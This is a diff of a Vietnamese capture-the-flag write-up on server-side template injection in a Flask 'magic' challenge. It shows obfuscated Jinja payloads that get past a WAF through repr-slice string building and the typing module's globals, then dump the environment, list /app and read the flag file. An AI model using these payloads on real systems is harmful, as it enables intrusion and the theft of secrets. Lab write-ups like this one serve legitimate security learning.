@@ -24,7 +24,7 @@ Phép thuật chưa bao giờ là con đường bằng phẳng. Chỉ khi kiên 
 
 ## Tổng quan
 
-Đọc qua source thì ta thấy ở route /api/cast_attack, khi attack_name không trùng key hợp lệ thì server sẽ xử lí như sau:
+Đọc qua source thì ta thấy ở route `/api/cast_attack`, khi `attack_name` không trùng key hợp lệ thì server sẽ xử lí như sau:
 
 ```python
 @app.route("/api/cast_attack")
@@ -127,10 +127,18 @@ def special_filter(user_input):
     return True
 ```
 
+Để có được payload hoàn chỉnh thì mình đã research khá nhiều, dưới đây là những gì mình rút ra được:  
+- Né WAF bằng cách không dùng literal nhạy cảm, có thể dùng cách ghép chuỗi từ các ký tự lẻ lấy ra bằng `repr` và chỉ số.
+- `sessions` bị chặn nhưng mà thứ mình cần trong payload là `session` để tham chiếu tới phiên người dùng hiện tại.
+- Cắt lát ký tự, cộng chuỗi bằng cách rút từng ký tự từ biểu diễn của `None/False/True/float` và đường dẫn module sau đó nối lại bằng phép cộng chuỗi.
+- Dùng `os.popen` và `os.read` để đọc file thay vì `open()`, để tránh hàm bị chặn và tránh tạo object file trong template.
+- Phải tìm ra một package có thể gọi được `os` và `sys` phục vụ cho việc đọc mở file.  
+
+Mình research khá lâu và thấy gói package `typing` của python3. Trong typing có hàm `__globals__` , dựa vào hàm này để gọi được `sys` và `os` mà không cần `__builtins__` hay `import`.  
+
 Đây là cách giải của mình:
 
-1. Tìm xem có `typing` không:
-
+1. Đa số là sẽ có nhưng vẫn check lại xem có `typing` không:
 ```powershell
 # {{session.__init__.__globals__.t.__repr__()}}
 
@@ -160,7 +168,7 @@ preimage: _snrlo>.__)_>d.5pe)(_n_.(_o)}i_bes(ii_b_]rd)(a}ca_)s>)et).(5)ldnr3t_e3
 <i>No magic name &lt;module &#39;os&#39; (frozen)&gt; here, try again!</i>
 ```
 
-4. Đọc `ENV`:
+4. Đọc `env`:
 
 ```powershell
 # {{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[((none.__repr__())[1]).__add__((((3>5)and(2<3)).__repr__()[3]))].environ.__repr__()}}
@@ -170,7 +178,7 @@ preimage: e(._.[_e_v-s2s_3g]e_o.e___.)})_.ri)sl3b.ea_))p}l)pa_(__n[_nret3))i_tr(
 <i>No magic name environ({&#39;KUBERNETES_SERVICE_PORT&#39;: &#39;443&#39;, &#39;KUBERNETES_PORT&#39;: &#39;tcp://10.100.0.1:443&#39;, &#39;HOSTNAME&#39;: &#39;magic-random-ea5710c0c1194be0&#39;, &#39;PYTHON_PIP_VERSION&#39;: &#39;24.0&#39;, &#39;SHLVL&#39;: &#39;1&#39;, &#39;HOME&#39;: &#39;/app&#39;, &#39;GPG_KEY&#39;: &#39;7169605F62C751356D054A26A821E680E5FA6305&#39;, &#39;PYTHON_GET_PIP_URL&#39;: &#39;https://github.com/pypa/get-pip/raw/dbf0c85f76fb6e1ab42aa672ffca6f0a675d9ee4/public/get-pip.py&#39;, &#39;KUBERNETES_PORT_443_TCP_ADDR&#39;: &#39;10.100.0.1&#39;, &#39;PATH&#39;: &#39;/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#39;, &#39;KUBERNETES_PORT_443_TCP_PORT&#39;: &#39;443&#39;, &#39;KUBERNETES_PORT_443_TCP_PROTO&#39;: &#39;tcp&#39;, &#39;LANG&#39;: &#39;C.UTF-8&#39;, &#39;PYTHON_VERSION&#39;: &#39;3.12.2&#39;, &#39;KUBERNETES_SERVICE_PORT_HTTPS&#39;: &#39;443&#39;, &#39;KUBERNETES_PORT_443_TCP&#39;: &#39;tcp://10.100.0.1:443&#39;, &#39;KUBERNETES_SERVICE_HOST&#39;: &#39;10.100.0.1&#39;, &#39;PWD&#39;: &#39;/app&#39;, &#39;PYTHON_GET_PIP_SHA256&#39;: &#39;dfe9fd5c28dc98b5ac17979a953ea550cec37ae1b47a5116007395bfacff2ab9&#39;, &#39;GZCTF_TEAM_ID&#39;: &#39;1250&#39;, &#39;WERKZEUG_SERVER_FD&#39;: &#39;3&#39;}) here, try again!</i>
 ```
 
-5. Liệt kê các file có trong `/app`:
+5. Tìm được đường dir `/app` rồi thì kê các file có trong nó:
 
 ```powershell
 # {{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].listdir((session.__init__.__globals__.__spec__.origin)[0].__add__(((3>5)and(2<3)).__repr__()[1]).__add__((session.__init__.__globals__.__spec__.origin)[-2]).__add__((session.__init__.__globals__.__spec__.origin)[-2]))}}
@@ -180,7 +188,7 @@ preimage: d_0[a(>(n_>]._gi.i_35r___1<t)).(_aa>itd_{_d]tn)_<n)_.._5<)nar3_(r()__s
 <i>No magic name [&#39;flag_3i3Bqp92KMSCXkT.txt&#39;, &#39;static&#39;, &#39;templates&#39;, &#39;app.py&#39;] here, try again!</i>
 ```
 
-6. Đọc file flag trong `/app`:
+6. Mình thấy có file flag tên là `flag_3i3Bqp92KMSCXkT.txt` trong `/app`, giờ thì đọc nó nữa thôi là solve bài này:
 
 ```powershell
 # {{(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].read((session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].open(((session.__init__.__globals__.__spec__.origin)[0].__add__(((3>5)and(2<3)).__repr__()[1]).__add__((session.__init__.__globals__.__spec__.origin)[-2]).__add__((session.__init__.__globals__.__spec__.origin)[-2])).__add__((session.__init__.__globals__.__spec__.origin)[0]).__add__((session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].listdir((session.__init__.__globals__.__spec__.origin)[0].__add__(((3>5)and(2<3)).__repr__()[1]).__add__((session.__init__.__globals__.__spec__.origin)[-2]).__add__((session.__init__.__globals__.__spec__.origin)[-2]))[0]),(session.__init__.__globals__.t.__dict__[(((3>5)and(2<3)).__repr__()[3]).__add__(session.__init__.__globals__.t.__spec__.origin[-1]).__add__(((3>5)and(2<3)).__repr__()[3])]).modules[(none.__repr__())[1].__add__(((3>5)and(2<3)).__repr__()[3])].O_RDONLY),8192)}}
